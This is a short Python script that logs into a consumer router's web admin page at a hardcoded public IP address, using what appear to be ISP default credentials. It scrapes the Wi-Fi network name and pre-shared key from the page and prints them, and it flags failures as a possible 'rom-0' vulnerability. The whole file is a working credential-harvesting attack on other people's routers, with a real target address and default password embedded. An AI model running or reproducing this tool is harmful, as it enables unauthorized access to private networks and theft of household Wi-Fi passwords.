import requests as rq
from netaddr import *
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
global user, password

user = "Customer"
password = "ClienteETB2006"
ip = "186.28.233.116"
try:
    req = rq.get("http://"+ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
    
    source = BeautifulSoup(req.content, "html.parser")
    
    for red in source.find_all("input", {"name":"ESSID"}):
        ssid = str(red["value"])
        if ssid == "CPE-WI-FI_ETB":
            print str(ip)+" Free wifi \n//////////////////////////////////"
            print " free wifi\n"
        else:
            
            for clave in source.find_all("input", {"name":"PreSharedKey"}):
                
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                
except:
    
    print ",posible rom-0"+"\n"